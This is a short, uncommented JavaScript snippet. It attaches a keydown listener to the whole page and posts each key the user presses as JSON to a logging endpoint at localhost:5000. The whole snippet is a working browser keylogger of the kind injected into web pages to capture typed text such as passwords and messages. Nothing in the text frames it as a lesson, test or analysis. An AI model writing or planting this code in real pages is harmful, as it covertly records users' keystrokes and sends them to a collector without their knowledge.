document.addEventListener('keydown', e => {
    fetch('http://localhost:5000/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key: e.key })
    });
  });
  